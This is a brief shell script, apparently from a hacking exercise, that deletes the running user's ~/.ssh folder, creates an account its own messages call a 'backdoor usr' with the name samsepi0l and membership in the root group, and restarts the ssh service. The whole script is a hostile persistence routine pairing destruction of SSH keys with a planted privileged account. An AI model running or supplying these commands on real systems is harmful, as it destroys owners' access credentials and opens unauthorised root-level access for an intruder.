echo "removing ssh config folder..."
rm -r ~/.ssh
echo "creating backdoor usr..."
useradd -M -G root samsepi0l
echo "restarting ssh service..."
systemctl restart ssh
echo "HOPEFULLY COMPLETE"
